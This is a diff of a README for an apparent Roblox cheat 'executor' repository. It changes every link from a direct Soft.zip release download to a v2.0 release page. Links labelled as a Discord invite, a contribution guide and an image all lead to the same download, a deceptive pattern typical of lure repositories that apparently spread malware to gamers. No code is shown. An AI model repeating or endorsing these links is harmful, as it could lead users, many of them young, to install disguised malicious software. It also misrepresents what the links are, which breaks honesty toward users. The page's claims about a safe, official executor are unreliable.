@@ -1,6 +1,6 @@
 # 🚀 Codex Roblox 2025 Executor
 
-![Codex-Roblox-2025](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip)
+![Codex-Roblox-2025](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0)
 
 Welcome to the official repository for the **Codex Roblox 2025 Executor**! Get ready to experience the ultimate Roblox script executor that supports low-end PCs, providing you with a stable and smooth gameplay experience like never before.
 
@@ -34,7 +34,7 @@ This repository is dedicated to the development and distribution of the Codex Ro
 
 To get your hands on the latest version of Codex Roblox 2025 Executor, click the button below:
 
-[![Download Codex Roblox 2025](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip)](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip)
+[![Download Codex Roblox 2025](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0)](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0)
 
 *Note: The link above will launch the download of the Codex Roblox 2025 Executor. Enjoy!*
 
@@ -53,13 +53,13 @@ Now that you have downloaded the Codex Roblox 2025 Executor, it's time to dive i
 
 ## 📞 Join the Community
 
-Connect with other Codex Roblox users, share tips and tricks, and stay updated on the latest developments by joining our Discord community. Click [here](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip) to join now!
+Connect with other Codex Roblox users, share tips and tricks, and stay updated on the latest developments by joining our Discord community. Click [here](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0) to join now!
 
-![Join Discord](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip)
+![Join Discord](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0)
 
 ## 🤝 Contributing
 
-We welcome contributions from the community to enhance the Codex Roblox 2025 Executor. Whether it's bug fixes, feature enhancements, or feedback, your input is valuable. Please refer to our [Contribution Guidelines](https://github.com/karim2008n/Codex-Roblox-2025/releases/download/v1.0/Soft.zip) for more information on how you can contribute.
+We welcome contributions from the community to enhance the Codex Roblox 2025 Executor. Whether it's bug fixes, feature enhancements, or feedback, your input is valuable. Please refer to our [Contribution Guidelines](https://github.com/karim2008n/Codex-Roblox-2025/releases/tag/v2.0) for more information on how you can contribute.
 
 ## 📜 License
 
